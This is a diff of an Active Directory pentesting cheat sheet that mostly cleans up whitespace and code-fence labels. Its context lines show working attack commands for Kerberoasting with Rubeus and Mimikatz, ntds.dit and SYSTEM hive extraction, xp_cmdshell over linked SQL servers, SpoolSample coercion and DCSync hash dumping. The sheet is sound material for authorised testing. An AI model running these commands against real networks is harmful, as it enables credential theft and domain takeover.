@@ -3,7 +3,7 @@
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
 ## TODO: cleanup code examples for scripting \($var, etc.\)
@@ -47,7 +47,7 @@ Always ensure you have **explicit** permission to access any computer system **b
 
   ```text
   Get-ADComputer -Filter * -Properties *
-  Get-ADGroup -Filter * 
+  Get-ADGroup -Filter *
   ```
 
 * **Enumerate Domain Trust:**
@@ -238,7 +238,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```text
 #Using .exe ingestor
 .\SharpHound.exe --CollectionMethod All --LDAPUser $UserName --LDAPPass $Password --JSONFolder $OutFile_Path
-    
+
 #Using powershell module ingestor
 .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All  -LDAPUser $UserName -LDAPPass $Password -OutputDirectory $OutFile_Path
@@ -439,7 +439,7 @@ Invoke-Kerberoast
 
 #Requesting the TGS for a single account:
 Request-SPNTicket
-  
+
 #Export all tickets using Mimikatz
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
@@ -468,7 +468,7 @@ Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /rc4opsec
 
 #Kerberoast AES enabled accounts
 Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /aes
- 
+
 #Kerberoast spesific user account
 Rubeus.exe kerberoast /outfile:$Out_File /domain:$DomainName /user:$UserName /simple
 
@@ -552,10 +552,10 @@ _If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on
 ```text
 #Check for interesting permissions on accounts:
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
- 
+
 #Check if current user has already an SPN setted:
 Get-DomainUser -Identity $UserName | select serviceprincipalname
- 
+
 #Force set the SPN on the account:
 Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
 ```
@@ -565,7 +565,7 @@ Set-DomainObject $UserName -Set @{serviceprincipalname='ops/whatever1'}
 ```text
 #Check if current user has already an SPN setted
 Get-ADUser -Identity $UserName -Properties ServicePrincipalName | select ServicePrincipalName
-  
+
 #Force set the SPN on the account:
 Set-ADUser -Identiny $UserName -ServicePrincipalNames @{Add='ops/whatever1'}
 ```
@@ -579,10 +579,10 @@ If you have local administrator access on a machine try to list shadow copies, i
 ```text
 #List shadow copies using vssadmin (Needs Admnistrator Access)
 vssadmin list shadows
-  
+
 #List shadow copies using diskshadow
 diskshadow list shadows all
-  
+
 #Make a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
@@ -769,9 +769,9 @@ set metadata c:\windows\system32\spool\drivers\color\example.cab
 set verbose on  
 begin backup  
 add volume c: alias mydrive  
- 
+
 create  
-  
+
 expose %mydrive% w:  
 end backup  
 }
@@ -786,18 +786,18 @@ diskshadow /s script.txt
 #Importing both dlls from the repo using powershell
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Import-Module .\SeBackupPrivilegeUtils.dll
-  
+
 #Checking if the SeBackupPrivilege is enabled
 Get-SeBackupPrivilege
-  
+
 #If it isn't we enable it
 Set-SeBackupPrivilege
-  
+
 #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
 Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
-  
+
 #Dump the SYSTEM hive
-reg save HKLM\SYSTEM c:\temp\system.hive 
+reg save HKLM\SYSTEM c:\temp\system.hive
 ```
 
 1. Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.
@@ -1017,7 +1017,7 @@ Check for existing Database Links:
 #Check for existing Database Links:
 #PowerUpSQL:
 Get-SQLServerLink -Instace <SPN> -Verbose
-     
+
 #MSSQL Query:
 select * from master..sysservers
 ```
@@ -1027,10 +1027,10 @@ Then we can use queries to enumerate other links from the linked Database:
 ```text
 #Manualy:
 select * from openquery("LinkedDatabase", 'select * from master..sysservers')
-     
+
 #PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
 Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
-     
+
 #Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
 #Or if it is disabled enable it:
 EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
@@ -1065,7 +1065,7 @@ SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
 Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>
 
 #Dump the hashes of the target domain using mimikatz:
-lsadump::dcsync /domain:external.forest.local /all 
+lsadump::dcsync /domain:external.forest.local /all
 ```
 
 Detailed Articles:
@@ -1077,7 +1077,7 @@ Detailed Articles:
 
 ## Get Domain Information
 
-```
+```text
 nltest /DCLIST:DomainName
 nltest /DCNAME:DomainName
 nltest /DSGETDC:DomainName
@@ -1086,20 +1086,20 @@ nltest /DSGETDC:DomainName
 ### Get Current Domain Info
 
 ```text
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
 ```
 
 ### View Domain Forest Info
 
 ```text
-[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+
 ```
 
-###  View Domain Trust Information
+### View Domain Trust Information
 
 #### Using PowerShell
 
-```
+```text
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
@@ -1107,7 +1107,7 @@ nltest /DSGETDC:DomainName
 
 #### Using CMD.exe
 
-```
+```text
 nltest /domain_trusts
 
 nltest [server:<fqdn_foreign_domain>] /domain_trusts /all_trusts /v
@@ -1119,14 +1119,14 @@ nltest /server:<ip_dc> /domain_trusts /all_trusts
 
 ### View All Domain Controllers
 
-```
+```text
 nltest /dclist:$domainFQDN
 net group "domain controllers" /domain
 ```
 
 ### View DC for Current Session
 
-```
+```text
 nltest /dsgetdc:$domainFQDN
 ```
 
@@ -1134,45 +1134,45 @@ nltest /dsgetdc:$domainFQDN
 
 ### get domain name and DC the user authenticated to
 
-```
+```text
 klist
 ```
 
 ### Get All Logged on Sessions, Includes NTLM & Kerberos
 
-```
+```text
 klist sessions
 ```
 
 ### View Current Kerberos Tickets
 
-```
+```text
 klist
 ```
 
 ### View Cached Krbtgt
 
-```
+```text
 klist tgt
 ```
 
 ## User Enumeration
 
-### Get User-related Environment Variables (cmd.exe)
+### Get User-related Environment Variables \(cmd.exe\)
 
-```
+```text
 set u
 ```
 
 ### List all Usernames
 
-```
+```text
 ([adsisearcher]"(&(objectClass=User)(samaccountname=*))").FindAll().Properties.samaccountname
 ```
 
 ### List Administrators
 
-```
+```text
 ([adsisearcher]"(&(objectClass=User)(admincount=1))").FindAll().Properties.samaccountname
 ```
 
@@ -1180,22 +1180,21 @@ set u
 
 #### Using PowerShell
 
-```
+```text
 ([adsisearcher]"(&(objectClass=User)(samaccountname=<username>))").FindAll().Properties
 ```
 
 #### Using CMD.exe
 
-```
+```text
 nltest /user:"zweilos"
 ```
 
 ### View All Users with Description Field Set
 
-```
+```text
 ([adsisearcher]"(&(objectClass=group)(samaccountname=*))").FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }
 ```
-
 
 ## Active Directory PowerShell Commands
 
@@ -1477,13 +1476,9 @@ get-GPO -all | select DisplayName, gpostatus
 Backup-Gpo -All -Path E:GPObackup
 ```
 
-
-
 ## Resources
 
 * [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
-
-
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
